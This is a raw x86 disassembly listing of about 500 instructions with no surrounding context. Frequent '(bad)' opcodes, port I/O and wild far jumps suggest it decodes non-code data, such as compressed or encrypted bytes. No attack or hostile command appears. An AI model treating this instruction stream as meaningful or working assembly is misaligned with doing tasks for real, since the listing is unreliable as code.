  421ee0:	jl     0x421e73
  421ee2:	mov    al,ds:0x837eee58
  421ee7:	add    dl,dl
  421ee9:	(bad)  
  421eea:	jmp    0xd416:0x38974ce2
  421ef1:	pop    es
  421ef2:	retf   
  421ef3:	sub    bl,ch
  421ef5:	xchg   BYTE PTR [esi],cl
  421ef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ef8:	cdq    
  421ef9:	sbb    al,0x26
  421efb:	xchg   ecx,eax
  421efc:	push   ebp
  421efd:	mov    eax,0x655bc1ee
  421f02:	shr    BYTE PTR [esi],1
  421f04:	mov    eax,0x37d60c73
  421f09:	dec    ebp
  421f0a:	arpl   bp,ax
  421f0c:	push   ss
  421f0d:	jae    0x421eaa
  421f0f:	xor    al,0x9f
  421f11:	pop    edi
  421f12:	fcomp  st(7)
  421f14:	push   0xa00f26e2
  421f19:	cmp    dh,BYTE PTR [edi+edx*1+0xd]
  421f1d:	xor    al,0x45
  421f1f:	sbb    ch,BYTE PTR [edx-0x48709fe3]
  421f25:	repz mov esp,0x2145a537
  421f2b:	pop    ss
  421f2c:	pop    ax
  421f2e:	pop    esi
  421f2f:	xor    ebx,edi
  421f31:	out    0x8f,eax
  421f33:	or     bl,BYTE PTR [edi-0x68]
  421f36:	mov    edi,0x784754fb
  421f3b:	fcom   QWORD PTR [ebx]
  421f3d:	sbb    al,BYTE PTR [edi-0x149f6555]
  421f43:	loopne 0x421ec8
  421f45:	in     eax,dx
  421f46:	adc    edi,ecx
  421f48:	(bad)  
  421f4a:	out    0xae,al
  421f4c:	add    DWORD PTR ds:0xdf8a5fa6,edi
  421f52:	ins    BYTE PTR es:[edi],dx
  421f53:	popa   
  421f54:	sbb    al,BYTE PTR [ebx]
  421f56:	dec    eax
  421f57:	xchg   esi,eax
  421f58:	rcr    DWORD PTR [edx-0x50],1
  421f5b:	jg     0x421fb5
  421f5d:	hlt    
  421f5e:	mov    bl,0xe3
  421f60:	xchg   BYTE PTR [ecx+0x9],bh
  421f63:	dec    esi
  421f64:	dec    esi
  421f65:	cmp    DWORD PTR [ebx-0x1c],edx
  421f68:	or     ah,ch
  421f6a:	outs   dx,BYTE PTR ds:[esi]
  421f6b:	bound  ebp,QWORD PTR [esi]
  421f6d:	pop    eax
  421f6e:	js     0x421f88
  421f70:	aaa    
  421f71:	(bad)  
  421f72:	jns    0x421fe9
  421f74:	or     DWORD PTR [ecx+0x2330cd69],ebp
  421f7a:	outs   dx,DWORD PTR ds:[esi]
  421f7b:	jo     0x421f9c
  421f7d:	pusha  
  421f7e:	dec    ebp
  421f7f:	jp     0x421fa8
  421f81:	lock out 0x5d,al
  421f84:	adc    eax,0x4b661fb5
  421f89:	(bad)  
  421f8a:	lock sbb bh,al
  421f8d:	mov    al,ds:0xf7942dbd
  421f92:	jns    0x421f4f
  421f94:	pop    ebp
  421f95:	lock shl BYTE PTR [ecx-0x5d],1
  421f99:	dec    esp
  421f9a:	in     al,0x30
  421f9c:	repz sub DWORD PTR [ecx+0x47],ebx
  421fa0:	xor    eax,ebp
  421fa2:	sar    BYTE PTR [edx],cl
  421fa4:	jmp    0x8bcdef40
  421fa9:	xchg   ebx,eax
  421faa:	rcr    cl,cl
  421fac:	add    esp,DWORD PTR [ecx+ebp*8+0x5d]
  421fb0:	jmp    0x762426f5
  421fb5:	cmp    ch,BYTE PTR [eax]
  421fb7:	or     cl,dl
  421fb9:	fcmovnb st,st(0)
  421fbb:	ror    BYTE PTR [ebx+0x51],0xca
  421fbf:	or     eax,0x39e94e18
  421fc4:	cmp    esi,ebp
  421fc6:	mov    ds:0xc4bc9edb,eax
  421fcb:	aad    0x40
  421fcd:	sbb    eax,0xb02c417b
  421fd2:	sbb    DWORD PTR [eax],ebp
  421fd4:	cmc    
  421fd5:	sbb    al,0x8c
  421fd7:	shl    DWORD PTR [ecx+0x30],1
  421fda:	push   ecx
  421fdb:	daa    
  421fdc:	xchg   edi,eax
  421fdd:	test   BYTE PTR [ebp+eiz*4-0x327614c4],cl
  421fe4:	(bad)  
  421fe5:	aad    0x53
  421fe7:	add    bl,ch
  421fe9:	mov    edx,0x2315709
  421fee:	out    dx,al
  421fef:	mov    BYTE PTR [edx-0x57769589],bh
  421ff5:	aaa    
  421ff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ff7:	imul   esi,DWORD PTR [edx+eax*8],0x72a0a736
  421ffe:	ins    BYTE PTR es:[edi],dx
  421fff:	mov    edi,0xa8dab8df
  422004:	mov    ebx,0xbac59e84
  422009:	cmp    eax,0x5ad86118
  42200e:	push   ds
  42200f:	cmp    BYTE PTR [edi+0x7126d9b],dh
  422015:	rcl    DWORD PTR [edx],0x48
  422018:	enter  0xb7c7,0x18
  42201c:	mov    esi,0x8d7ba99b
  422021:	out    0x35,eax
  422023:	imul   ebp,DWORD PTR [eax-0x405366b8],0xffffffcc
  42202a:	or     edi,DWORD PTR [ecx+edx*1-0x22]
  42202e:	mov    eax,ds:0x27599496
  422033:	inc    ecx
  422034:	cs mov esi,0x2db25800
  42203a:	jae    0x42207a
  42203c:	(bad)  
  42203e:	inc    edx
  42203f:	sub    DWORD PTR [ecx-0x78],edi
  422042:	mov    cl,0x8c
  422044:	xchg   DWORD PTR [esi-0x18],ebx
  422047:	push   0xffffffae
  422049:	sti    
  42204a:	xlat   BYTE PTR ds:[ebx]
  42204b:	shl    DWORD PTR [edi+0x18],0x8
  42204f:	sub    dh,BYTE PTR [ebp+0x50]
  422052:	xor    DWORD PTR [ebx+0x4c8d0aa4],ebp
  422058:	popa   
  422059:	push   0x6bd148d5
  42205e:	(bad)  
  422060:	inc    esi
  422061:	call   0xc58f:0xca31aab5
  422068:	and    DWORD PTR [ebx-0x68],esp
  42206b:	xor    dl,al
  42206d:	fcomip st,st(1)
  42206f:	iret   
  422070:	(bad)  
  422071:	mov    ds:0x8c83b57,eax
  422076:	jmp    0x4c228ba
  42207b:	fld    DWORD PTR [edx-0x5d]
  42207e:	push   ds
  42207f:	jmp    0x415e:0x6cd8c667
  422086:	push   ss
  422087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422088:	adc    al,0x1a
  42208a:	inc    esi
  42208b:	mov    al,0xf
  42208d:	dec    eax
  42208e:	jmp    0x8fbf507d
  422093:	sbb    al,0x29
  422095:	rdpmc  
  422097:	and    al,0x70
  422099:	ror    ch,0x3f
  42209c:	sub    al,0x7e
  42209e:	scas   al,BYTE PTR es:[edi]
  42209f:	icebp  
  4220a0:	lods   eax,DWORD PTR ds:[esi]
  4220a1:	xchg   esi,eax
  4220a2:	cmp    eax,0xcceb6563
  4220a7:	(bad)  
  4220a8:	(bad)  [esi]
  4220aa:	sbb    DWORD PTR [ebp+0x1c],eax
  4220ad:	add    BYTE PTR [eax],al
  4220af:	add    BYTE PTR [eax],al
  4220b1:	add    BYTE PTR [ecx],bh
  4220b3:	stc    
  4220b4:	pop    ebx
  4220b5:	sub    ebx,ebx
  4220b7:	stos   DWORD PTR es:[edi],eax
  4220b8:	jns    0x4220b5
  4220ba:	dec    edx
  4220bb:	sub    bl,0xe9
  4220be:	xchg   esi,eax
  4220bf:	xor    al,0xb3
  4220c1:	jmp    0x4f3:0x19a71
  4220c8:	add    BYTE PTR [eax],al
  4220ca:	xor    BYTE PTR [ecx+0x463e422f],al
  4220d0:	push   edx
  4220d1:	(bad)  
  4220d2:	in     al,dx
  4220d3:	push   eax
  4220d4:	ror    DWORD PTR [ebx],1
  4220d6:	rcl    ebp,0xc
  4220d9:	xor    al,0x80
  4220db:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4220dd:	call   0xf305:0xb198aed5
  4220e4:	jae    0x4220f7
  4220e6:	dec    esi
  4220e7:	into   
  4220e8:	xchg   esi,eax
  4220e9:	ffreep st(5)
  4220eb:	lods   eax,DWORD PTR ds:[esi]
  4220ec:	(bad)  
  4220ed:	sub    cl,BYTE PTR [ebp-0x15]
  4220f0:	in     eax,dx
  4220f1:	sub    dh,BYTE PTR [ecx]
  4220f3:	je     0x422147
  4220f5:	inc    ebx
  4220f6:	pop    ebp
  4220f7:	xor    ch,BYTE PTR [eax]
  4220f9:	nop
  4220fa:	pop    esi
  4220fb:	rol    BYTE PTR [ebp-0x53],0xb7
  4220ff:	sar    esp,1
  422101:	cwde   
  422102:	aaa    
  422103:	dec    eax
  422104:	xor    DWORD PTR [ebp+0x47ae2c0d],ebx
  42210a:	add    DWORD PTR [ebp-0x4dbacb56],edx
  422110:	hlt    
  422111:	lods   al,BYTE PTR ds:[esi]
  422112:	mov    eax,DWORD PTR [ebx]
  422114:	jnp    0x4220f0
  422116:	cmp    DWORD PTR [edi-0x7b],ecx
  422119:	repz mov ah,0x7
  42211c:	jae    0x4220ea
  42211e:	mov    fs,ebp
  422120:	ds xchg edi,eax
  422122:	sub    DWORD PTR [eax+0x5b],ebx
  422125:	xor    eax,0xb42d8d01
  42212a:	nop
  42212b:	lahf   
  42212c:	inc    ebx
  42212d:	(bad)  
  42212e:	sbb    BYTE PTR ds:0xe276635b,cl
  422134:	or     edi,DWORD PTR [ecx-0x60792b8a]
  42213a:	inc    eax
  42213b:	es jmp 0x91e9da95
  422141:	loop   0x42215c
  422143:	test   DWORD PTR [ebx+esi*2+0x57b324a9],edi
  42214a:	in     eax,dx
  42214b:	dec    ebp
  42214c:	and    eax,0xa3c772d7
  422151:	or     DWORD PTR [edi-0x71],ebp
  422154:	pop    ebx
  422155:	push   cs
  422156:	lea    ebp,[ecx]
  422158:	push   esp
  422159:	or     eax,0x26ca4041
  42215e:	dec    ebp
  42215f:	mov    bh,0xa3
  422161:	test   DWORD PTR [ebx-0x68],ebx
  422164:	stc    
  422165:	(bad)  
  422166:	and    esi,DWORD PTR [edi]
  422168:	push   es
  422169:	jbe    0x42215c
  42216b:	xor    DWORD PTR [ebp+eax*2-0x53],ebx
  42216f:	retf   
  422170:	pop    ss
  422171:	and    eax,DWORD PTR [eax]
  422173:	pop    ecx
  422174:	dec    edi
  422175:	push   ss
  422176:	xchg   BYTE PTR [ebx+0x6625b950],cl
  42217c:	jmp    0x422168
  42217e:	rol    edi,cl
  422180:	pop    ss
  422181:	or     esp,DWORD PTR [ebp+ebp*8+0x60]
  422185:	xor    DWORD PTR [edx],edi
  422187:	cmp    eax,0x4b82dc2
  42218c:	jae    0x422189
  42218e:	sbb    al,0x88
  422190:	(bad)  
  422191:	and    ah,BYTE PTR [ecx+0x65b35526]
  422197:	jge    0x4221c5
  422199:	jnp    0x4221ac
  42219b:	or     BYTE PTR [ecx+0x1a],ah
  42219e:	inc    edi
  42219f:	push   esi
  4221a0:	arpl   WORD PTR [ecx+0x30],cx
  4221a3:	popa   
  4221a4:	popf   
  4221a5:	ins    BYTE PTR es:[edi],dx
  4221a6:	mov    cl,BYTE PTR [esi-0x70]
  4221a9:	sub    ah,BYTE PTR [ecx+0x72]
  4221ac:	shr    BYTE PTR [eax],cl
  4221ae:	jno    0x4221b0
  4221b0:	push   0xffffff84
  4221b2:	div    ebx
  4221b4:	test   esi,edi
  4221b6:	and    al,0x24
  4221b8:	push   ss
  4221b9:	sti    
  4221ba:	jno    0x42219f
  4221bc:	jae    0x422156
  4221be:	cwde   
  4221bf:	std    
  4221c0:	jb     0x450ba8ff
  4221c6:	(bad)  
  4221c7:	cld    
  4221c8:	mov    bl,0xef
  4221ca:	xor    ah,ch
  4221cc:	nop
  4221cd:	iret   
  4221ce:	or     ah,0x6d
  4221d1:	and    al,0x38
  4221d3:	sub    BYTE PTR [edi-0x1f],ah
  4221d6:	lahf   
  4221d7:	ret    0x610e
  4221da:	and    eax,edi
  4221dc:	neg    dl
  4221de:	xor    bl,cl
  4221e0:	jae    0x422248
  4221e2:	fs gs xchg esp,eax
  4221e5:	sub    al,0x74
  4221e7:	aad    0x34
  4221e9:	sub    eax,0x58b86dec
  4221ee:	test   al,0xd0
  4221f0:	adc    al,0x5d
  4221f2:	pop    ss
  4221f3:	jbe    0x422264
  4221f5:	imul   edx,DWORD PTR [edi],0x228233a1
  4221fb:	cmp    bl,BYTE PTR [ebx]
  4221fd:	stc    
  4221fe:	inc    DWORD PTR [ecx+eiz*4-0x73]
  422202:	jge    0x422188
  422204:	sbb    eax,0x15b36c5b
  422209:	xor    dl,BYTE PTR [edi-0x1268631d]
  42220f:	loop   0x422192
  422211:	clc    
  422212:	fnstcw WORD PTR [ecx]
  422214:	je     0x4221f0
  422216:	add    BYTE PTR [edx+0x63],al
  422219:	push   ss
  42221a:	push   cs
  42221b:	xchg   ebx,eax
  42221c:	out    0x85,eax
  42221e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42221f:	push   cs
  422220:	sbb    eax,0xd4ab2294
  422225:	push   ss
  422226:	lods   eax,DWORD PTR ds:[esi]
  422227:	bound  ebp,QWORD PTR [eax+0x22]
  42222a:	adc    dl,bh
  42222c:	xchg   bl,al
  42222e:	sbb    cl,BYTE PTR [ebx+0x59]
  422231:	idiv   BYTE PTR [ebx*8-0x5cb24717]
  422238:	adc    eax,0x70199fdf
  42223d:	and    edi,ebp
  42223f:	jbe    0x422257
  422241:	inc    ecx
  422242:	push   eax
  422243:	sub    DWORD PTR [esi+0x7a],eax
  422246:	popa   
  422247:	xchg   edx,eax
  422248:	push   ebx
  422249:	jnp    0x4222be
  42224b:	es fcmovnbe st,st(0)
  42224e:	inc    edi
  42224f:	mov    eax,0xff107894
  422254:	rep ins BYTE PTR es:[edi],dx
  422256:	add    al,0x24
  422258:	push   eax
  422259:	jecxz  0x422256
  42225b:	aam    0x49
  42225d:	xor    BYTE PTR [esi-0x10],bh
  422260:	mov    cl,0xe9
  422262:	pop    es
  422263:	add    BYTE PTR [edi+0x77],ch
  422266:	pop    edi
  422267:	ds leave 
  422269:	or     eax,0xcc444d95
  42226e:	and    ch,BYTE PTR [edx]
  422270:	and    al,0x61
  422272:	cli    
  422273:	mov    dh,0x15
  422275:	retf   
  422276:	or     al,BYTE PTR [esi]
  422278:	mov    ss,WORD PTR [ebp+eax*1-0x83c0cbf]
  42227f:	sti    
  422280:	adc    DWORD PTR [ebx+0x7ea66206],eax
  422286:	jecxz  0x4222a0
  422288:	sbb    BYTE PTR [edi+0x781a9b6d],dh
  42228e:	jae    0x4222d3
  422290:	pslld  mm6,QWORD PTR [edi]
  422293:	cmp    eax,DWORD PTR [ecx+0x378be86d]
  422299:	mov    cl,cl
  42229b:	sbb    al,bl
  42229d:	int3   
  42229e:	push   0x62a48e20
  4222a3:	call   0xda6cebe8
  4222a8:	sbb    BYTE PTR [eax],bh
  4222aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222ab:	lods   al,BYTE PTR ds:[esi]
  4222ac:	push   esp
  4222ad:	mov    esi,0xbcc904f9
  4222b2:	popa   
  4222b3:	and    al,0x95
  4222b5:	inc    ebp
  4222b6:	sub    eax,0xfb91be21
  4222bb:	dec    ecx
  4222bc:	or     DWORD PTR [edx],ebp
  4222be:	mov    bl,0x97
  4222c0:	xchg   esi,eax
  4222c1:	jbe    0x42228a
  4222c3:	les    ebp,FWORD PTR [bp+0x2547]
  4222c8:	clc    
  4222c9:	dec    ecx
  4222ca:	mov    DWORD PTR [ebx-0x782a941e],ebp
  4222d0:	test   DWORD PTR [eax+0x2a5a8442],esi
  4222d6:	ins    BYTE PTR es:[edi],dx
  4222d7:	add    DWORD PTR [ebx],ebp
  4222d9:	pop    esi
  4222da:	pusha  
  4222db:	loope  0x4222b1
  4222dd:	jp     0x422283
  4222df:	add    eax,0x48c3c592
  4222e4:	mov    bl,0xf2
  4222e6:	jae    0x42235c
  4222e8:	fistp  DWORD PTR [edi+edx*8+0x1f]
  4222ec:	fstp   TBYTE PTR [ecx-0x4fd4dc1b]
  4222f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222f3:	inc    esi
  4222f4:	je     0x422296
  4222f6:	das    
  4222f7:	adc    DWORD PTR [ebx-0x2d],edi
  4222fa:	inc    edi
  4222fb:	push   0x6eb4691b
  422300:	dec    eax
  422301:	clc    
  422302:	sbb    al,0x8c
  422304:	xor    BYTE PTR [esi+0x2d],bl
  422307:	xchg   edi,eax
  422308:	mov    ecx,0xce3ac3cc
  42230d:	shl    BYTE PTR [ebp-0x5b],1
  422310:	pop    eax
  422311:	push   esi
  422312:	loop   0x42231e
  422314:	push   ecx
  422315:	ins    DWORD PTR es:[edi],dx
  422316:	in     al,dx
  422317:	fs mov esi,0x31854765
  42231d:	das    
  42231e:	xor    BYTE PTR [edx+0x68820696],ch
  422324:	ret    
  422325:	in     al,0x8f
  422327:	inc    edx
  422328:	push   ebx
  422329:	cmp    al,0x22
  42232b:	fst    QWORD PTR [edx]
  42232d:	inc    BYTE PTR [ecx]
  42232f:	ins    BYTE PTR es:[edi],dx
  422330:	mov    edx,0xc750d47a
  422335:	dec    esi
  422336:	push   esi
  422337:	hlt    
  422338:	cli    
  422339:	add    BYTE PTR [edi+esi*4+0x2309ecec],0xf3
  422341:	jbe    0x42230c
  422343:	into   
  422344:	fistp  WORD PTR [ebx-0x48585938]
  42234a:	das    
  42234b:	xor    edx,DWORD PTR [edx+0x66]
  42234e:	jae    0x422301
  422350:	pop    edi
  422351:	clc    
  422352:	mov    WORD PTR [esi+0x136e78e7],?
  422358:	and    esp,DWORD PTR [eax+0x34]
  42235b:	xchg   esi,eax
  42235c:	jnp    0x4223a2
  42235e:	xchg   edi,eax
  42235f:	xor    dl,ch
  422361:	push   ecx
  422362:	ret    0x6e04
  422365:	sub    eax,0xd1df215f
  42236a:	cdq    
  42236b:	mov    dh,0x9f
  42236d:	xchg   edi,eax
  42236e:	int    0x36
  422370:	dec    esi
  422371:	cmp    DWORD PTR [ebx],ecx
  422373:	pop    esp
  422374:	lods   al,BYTE PTR ds:[esi]
  422375:	jb     0x422361
  422377:	sub    cl,dh
  422379:	sub    ebx,edi
  42237b:	clc    
  42237c:	add    DWORD PTR [ebx],edx
  42237e:	adc    al,0x88
  422380:	mov    edi,fs
  422382:	int    0xa6
  422384:	pop    edi
  422385:	scas   al,BYTE PTR es:[edi]
  422386:	add    DWORD PTR [ebx],edi
  422388:	and    ch,BYTE PTR [edx+ebx*2]
  42238b:	xor    dh,ch
  42238d:	pop    ds
  42238e:	pop    edi
  42238f:	and    ecx,DWORD PTR ds:0x6449d613
  422395:	jecxz  0x422397
  422397:	sub    al,0xc2
  422399:	cmp    ebx,DWORD PTR [edx+0x78]
  42239c:	xchg   ebp,eax
  42239d:	mov    eax,0xbbdd3e0
  4223a2:	jmp    0x422343
  4223a4:	scas   al,BYTE PTR es:[edi]
  4223a5:	inc    edx
  4223a6:	push   cs
  4223a7:	sbb    eax,DWORD PTR [eax-0x44]
  4223aa:	sub    ebx,DWORD PTR [ecx-0xb82864c]
  4223b0:	imul   esp,edi,0xd0ec8fa0
  4223b6:	js     0x422347
  4223b8:	(bad)  
  4223b9:	lock sub al,BYTE PTR ds:0x9d17ce3b
  4223c0:	xchg   edi,eax
  4223c1:	call   0x3285:0x58401116
  4223c8:	and    esp,edx
  4223ca:	adc    al,0xf2
  4223cc:	fild   DWORD PTR [ebx]
  4223ce:	ins    DWORD PTR es:[edi],dx
  4223cf:	cmp    BYTE PTR [ebx],cl
  4223d1:	jg     0x4223ec
  4223d3:	out    0xe4,eax
  4223d5:	shl    BYTE PTR [eax+edi*2+0x7431aa0],1
  4223dc:	push   esi
  4223dd:	les    ebx,FWORD PTR [esi+0x499aa9f8]
  4223e3:	iret   
  4223e4:	inc    eax
  4223e5:	dec    edx
  4223e6:	push   eax
  4223e7:	cmp    esi,DWORD PTR [edi]
  4223e9:	retf   0xc937
  4223ec:	xchg   esi,eax
  4223ed:	leave  
  4223ee:	dec    edi
  4223ef:	jo     0x42241b
  4223f1:	and    DWORD PTR [esi],ecx
  4223f3:	xchg   DWORD PTR [esi],eax
  4223f5:	imul   edx,DWORD PTR [esi],0x58d9c56e
  4223fb:	and    BYTE PTR [esi+0x277971db],cl
  422401:	xor    edx,esi
  422403:	daa    
  422404:	xchg   ebp,eax
  422405:	ins    DWORD PTR es:[edi],dx
  422406:	pop    eax
  422407:	sar    DWORD PTR [ebp-0x66],cl
  42240a:	out    dx,al
  42240b:	scas   eax,DWORD PTR es:[edi]
  42240c:	lods   eax,DWORD PTR ds:[esi]
  42240d:	fcmovnb st,st(6)
  42240f:	dec    esi
  422410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422411:	inc    ebx
  422412:	or     DWORD PTR [ebp-0x8],ebp
  422415:	or     eax,0xd8432ee6
  42241a:	jo     0x422447
  42241c:	xor    ah,cl
  42241e:	mov    esp,edx
  422420:	aad    0x42
  422422:	inc    esi
  422423:	pop    edx
  422424:	sub    al,0xf0
  422426:	(bad)  
  422427:	pop    eax
  422429:	pop    ebp
  42242a:	sub    eax,0xb7d3ee91
  42242f:	mov    eax,ds:0x5d332d9d
  422434:	add    dh,BYTE PTR [ebx-0x79]
  422437:	outs   dx,BYTE PTR ds:[esi]
  422438:	dec    ecx
  422439:	and    eax,0x3760f84d
  42243e:	mov    eax,esp
  422440:	clc    
  422441:	mov    esi,0xc76cd283
  422446:	out    0x37,al
  422448:	jbe    0x422445
  42244a:	mov    al,0x50
  42244c:	inc    esi
  42244d:	arpl   WORD PTR [edi+0x33],di
  422450:	mov    ebx,0xcdb592c
  422455:	shl    BYTE PTR [esi+0x9],1
  422458:	sbb    eax,0x1e6f5333
  42245d:	push   ebp
  42245e:	push   edi
  42245f:	clc    
  422460:	sub    cl,BYTE PTR [esi-0x14]
  422463:	ret    0x1d2b
  422466:	mov    DWORD PTR [edi],esp
  422468:	popa   
  422469:	popa   
  42246a:	fwait
  42246b:	popf   
  42246c:	mov    ebx,0x6a35cd51
  422471:	ret    0xd362
  422474:	aam    0x5a
  422476:	push   edx
  422477:	stos   DWORD PTR es:[edi],eax
  422478:	and    eax,0x9ae43338
  42247d:	clc    
  42247e:	mov    ecx,0x1a58c1ee
  422483:	ss push ss
  422485:	gs xchg edi,eax
  422487:	retf   0xb84a
  42248a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42248b:	inc    edx
  42248c:	lods   eax,DWORD PTR ds:[esi]
  42248d:	stc    
  42248e:	adc    esp,DWORD PTR [esi]
  422490:	pop    ds
  422491:	add    bh,BYTE PTR [esi+0xc]
  422494:	push   ecx
  422495:	fsubr  st,st(7)
  422497:	and    al,0x89
  422499:	jle    0x4224fb
  42249b:	mov    edx,0xfddec3b9
  4224a0:	test   BYTE PTR [eax],bh
  4224a2:	jl     0x422505
  4224a4:	jo     0x4224d0
  4224a6:	mov    dl,0x4b
  4224a8:	or     edi,esi
  4224aa:	rcl    DWORD PTR [edx+0x64],0x58
  4224ae:	sti    
  4224af:	mov    al,ds:0xc29d74b8
  4224b4:	mov    ebx,0xb4373780
  4224b9:	jo     0x4224ad
  4224bb:	sub    al,0x1c
  4224bd:	out    dx,eax
  4224be:	int3   
  4224bf:	xor    edx,DWORD PTR [ecx+edi*2]
  4224c2:	jne    0x42253c
  4224c4:	cmp    eax,0x2f022c32
  4224c9:	push   ss
  4224ca:	mov    esp,0xa8204b69
  4224cf:	push   0x6bf491f1
  4224d4:	dec    eax
  4224d5:	sub    edi,DWORD PTR [ebx]
  4224d7:	cmp    eax,0xb0386ac
  4224dc:	addr16 stc 
  4224de:	aad    0x4c
  4224e0:	adc    al,0x21
  4224e2:	sbb    al,0xdd
  4224e4:	cmp    DWORD PTR [ebx-0x1e],ebp
  4224e7:	or     cl,al
  4224e9:	or     al,BYTE PTR [ecx]
  4224eb:	nop
  4224ec:	inc    edx
  4224ed:	lds    esp,FWORD PTR [ebx-0x53238b59]
  4224f3:	xchg   DWORD PTR [ecx],eax
  4224f5:	pop    esi
  4224f6:	push   ebp
  4224f7:	ins    DWORD PTR es:[edi],dx
  4224f8:	loope  0x42251e
  4224fa:	cmp    DWORD PTR [ebp+0x3c1e1f10],esp
  422500:	add    BYTE PTR [eax+0x3f0c254],cl
  422506:	aad    0xfd
  422508:	outs   dx,BYTE PTR ds:[esi]
  422509:	outs   dx,DWORD PTR ds:[esi]
  42250a:	gs jmp 0x422502
  42250d:	pcmpeqb mm1,QWORD PTR [edi-0xe]
  422511:	mov    ebx,0x7e6ac700
  422516:	mov    edi,0x21c59686
  42251b:	std    
  42251c:	mov    eax,ds:0x89048d48
  422521:	les    edi,FWORD PTR [ebp+0xaa0834d]
  422527:	sbb    DWORD PTR [ebx-0xe],ecx
  42252a:	cs mov bl,0x9c
  42252d:	(bad)  
  42252e:	enter  0x3095,0x47
  422532:	cs stos DWORD PTR es:[edi],eax
  422534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422535:	and    al,0x76
  422537:	mov    ds:0x7efb98e5,eax
  42253c:	xor    eax,0x35e61906
  422541:	popa   
  422542:	mov    ss,WORD PTR [ebp-0x360751b9]
  422548:	ror    DWORD PTR [edi-0x2dde2719],0xcb
  42254f:	neg    BYTE PTR [ecx+0x7335481]
  422555:	sbb    BYTE PTR [eax+edx*1],bl
  422558:	xor    eax,0xcaabe8be
  42255d:	xchg   esp,eax
  42255e:	and    dh,BYTE PTR [ebx]
  422560:	shl    ebx,cl
  422562:	jp     0x422511
  422564:	scas   al,BYTE PTR es:[edi]
  422565:	mov    edx,0x52e63399
  42256a:	sub    al,BYTE PTR [ebp-0x51922f4]
  422570:	leave  
  422571:	inc    edx
  422572:	pop    es
  422573:	out    dx,eax
  422574:	stc    
  422575:	xor    ah,BYTE PTR [eax-0xe691ced]
  42257b:	inc    edi
  42257c:	xor    ah,BYTE PTR [esi+0x5b]
  42257f:	js     0x422513
  422581:	fnstsw WORD PTR [ebx]
  422583:	sub    BYTE PTR [esi+0x2ef5a08f],bl
  422589:	ret    0x4715
  42258c:	pop    es
  42258d:	outs   dx,BYTE PTR ds:[esi]
  42258e:	and    bl,BYTE PTR [edi-0x44]
  422591:	push   ebp
  422592:	dec    esi
  422593:	inc    eax
  422594:	xchg   esp,eax
  422595:	(bad)  
  422598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422599:	sub    BYTE PTR [ecx-0x2ba9d259],bh
  42259f:	dec    eax
  4225a0:	pop    ds
  4225a1:	sahf   
  4225a2:	aad    0xda
  4225a4:	mov    eax,ds:0xf2eeeab0
  4225a9:	sti    
  4225aa:	xlat   BYTE PTR ds:[ebx]
  4225ab:	pop    ebx
  4225ac:	lods   eax,DWORD PTR ds:[esi]
  4225ad:	stos   DWORD PTR es:[edi],eax
  4225ae:	push   eax
  4225af:	or     DWORD PTR [ebx],eax
  4225b1:	loop   0x422534
  4225b3:	sub    dl,BYTE PTR [eax+0x4b394109]
  4225b9:	fld    QWORD PTR [esi+0x34]
  4225bc:	add    BYTE PTR [eax],0x0
  4225bf:	add    BYTE PTR [eax],al
  4225c1:	add    dl,cl
  4225c3:	adc    al,0x69
  4225c5:	dec    ecx
  4225c6:	(bad)  
  4225c7:	jge    0x4225b3
  4225c9:	xchg   edi,eax
  4225ca:	outs   dx,DWORD PTR ds:[esi]
  4225cb:	jge    0x422555
  4225cd:	call   0x9f64:0xf2503878
  4225d4:	add    DWORD PTR [eax],eax
  4225d6:	repz add al,0x0
  4225d9:	add    BYTE PTR [ebp-0x1529ca89],bh
  4225df:	cmp    ecx,DWORD PTR [eax]
  4225e1:	cld    
  4225e2:	add    edi,DWORD PTR [edi]
  4225e4:	stos   BYTE PTR es:[edi],al
  4225e5:	div    BYTE PTR [edi+eiz*4-0x10ce6b15]
  4225ec:	pop    edi
  4225ed:	or     dl,BYTE PTR [edx+eax*4]
  4225f0:	add    esi,ebp
  4225f2:	inc    eax
  4225f3:	lods   al,BYTE PTR ds:[esi]
  4225f4:	mov    ah,BYTE PTR ds:0x83977b72
  4225fa:	mov    WORD PTR [edi+ebx*4-0x5fe71658],cs
  422601:	test   al,0x79
  422603:	push   ds
  422604:	mov    bh,0xf2
  422606:	ror    DWORD PTR [edi-0x1faf9ea7],cl
  42260c:	and    eax,0x3e55c540
  422611:	ins    DWORD PTR es:[edi],dx
  422612:	mov    bh,0xeb
  422614:	adc    al,0x94
  422616:	jmp    0x42266e
  422618:	cmp    cl,BYTE PTR [edi+0x22]
  42261b:	adc    edi,DWORD PTR [edx]
  42261d:	sub    eax,0xc6e1bc5f
  422622:	outs   dx,DWORD PTR ds:[esi]
  422623:	cmp    al,0x3f
  422625:	outs   dx,DWORD PTR ds:[esi]
  422626:	mov    ds:0x305be3b,al
  42262b:	popf   
  42262c:	xchg   edx,eax
  42262d:	xor    al,dl
  42262f:	mov    al,ds:0x1f97b0d2
  422634:	lea    ebp,[edi]
  422636:	jno    0x42267e
  422638:	cmp    al,0x82
  42263a:	and    edx,DWORD PTR [ebx+0x69]
  42263d:	pop    edx
  42263e:	mov    ecx,0x3ea93e2d
  422643:	ja     0x4226b4
  422645:	mov    ch,0x51
  422647:	mov    al,ds:0x726b8577
  42264c:	xlat   BYTE PTR ds:[ebx]
  42264d:	jg     0x4226b4
  42264f:	xchg   edi,eax
  422650:	out    dx,al
  422651:	sub    BYTE PTR [ebp+0x2438a45d],al
  422657:	pushf  
  422658:	div    DWORD PTR [eax+esi*4+0x109df1e7]
  42265f:	mov    cl,0xc5
  422661:	dec    ebx
  422662:	cmp    eax,DWORD PTR [ebp+0x72067654]
  422668:	mov    es,ecx
  42266a:	xchg   ecx,eax
  42266b:	xchg   ebp,eax
  42266c:	mov    DWORD PTR [edi+edx*4+0x2cb8c5aa],ecx
  422673:	jmp    0x10e0:0xeaf5cd6f
  42267a:	loope  0x4226f2
  42267c:	ret    
  42267d:	xchg   edx,eax
  42267e:	jne    0x42260f
